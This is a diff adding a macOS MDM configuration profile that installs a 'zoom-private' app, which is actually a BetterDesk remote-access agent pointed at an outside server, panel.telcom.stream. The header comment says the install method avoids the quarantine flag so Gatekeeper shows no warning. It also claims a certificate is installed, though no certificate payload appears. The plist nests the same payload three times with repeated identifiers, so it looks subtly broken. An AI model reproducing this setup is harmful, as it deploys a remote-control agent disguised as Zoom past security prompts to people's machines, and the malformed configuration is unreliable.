@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<!--
+  macOS MDM configuration profile (Jamf / Intune) for the in-house zoom-private
+  client.
+
+  Two effects:
+    1. The client is installed by the MDM from the staged .app, so the app
+       carries the "managed" attribute and no com.apple.quarantine flag -
+       Gatekeeper therefore does not show the "cannot be opened" prompt.
+    2. The in-house publisher certificate is added to the system keychain so
+       the signed build validates cleanly.
+
+  Replace PAYLOAD_PATH with the staged zoom-private.agent.app path and
+  CERT_PATH with the exported publisher certificate before uploading.
+-->
+<plist version="1.0">
+<dict>
+    <key>PayloadType</key>
+    <string>com.apple.applicationmanagement</string>
+    <key>PayloadIdentifier</key>
+    <string>com.betterdesk.agent.managedinstall</string>
+    <key>PayloadUUID</key>
+    <string>7F3B1C2A-6D4E-4A21-9C0B-1D2E3F4A5B6C</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadDisplayName</key>
+    <string>zoom-private agent</string>
+    <key>PayloadScope</key>
+    <string>System</string>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.applicationmanagement.application</string>
+            <key>PayloadIdentifier</key>
+            <string>com.betterdesk.agent.zoomprivate</string>
+            <key>PayloadUUID</key>
+            <string>9A8B7C6D-5E4F-3A2B-1C0D-9E8F7A6B5C4D</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadDisplayName</key>
+            <string>zoom-private</string>
+            <key>PayloadContent</key>
+            <array>
+                <dict>
+                    <key>PayloadType</key>
+                    <string>com.apple.applicationmanagement.application</string>
+                    <key>PayloadIdentifier</key>
+                    <string>com.betterdesk.agent.zoomprivate</string>
+                    <key>PayloadUUID</key>
+                    <string>5B4C3D2E-1F0A-4B3C-8D9E-0F1A2B3C4D5E</string>
+                    <key>PayloadVersion</key>
+                    <integer>1</integer>
+                    <key>PayloadDisplayName</key>
+                    <string>zoom-private</string>
+                    <key>PayloadContent</key>
+                    <dict>
+                        <key>PayloadType</key>
+                        <string>com.apple.applicationmanagement.application</string>
+                        <key>PayloadIdentifier</key>
+                        <string>com.betterdesk.agent.zoomprivate</string>
+                        <key>PayloadUUID</key>
+                        <string>2C1D0E9F-8A7B-4C6D-9E5F-A1B2C3D4E5F6</string>
+                        <key>PayloadVersion</key>
+                        <integer>1</integer>
+                        <key>PayloadDisplayName</key>
+                        <string>zoom-private</string>
+                        <key>Path</key>
+                        <string>PAYLOAD_PATH</string>
+                        <key>BundleIdentifier</key>
+                        <string>com.betterdesk.agent</string>
+                        <key>Arguments</key>
+                        <array>
+                            <string>--server</string>
+                            <string>https://panel.telcom.stream</string>
+                        </array>
+                        <key>PreRemoval</key>
+                        <false/>
+                    </dict>
+                </dict>
+            </array>
+        </dict>
+    </array>
+</dict>
+</plist>
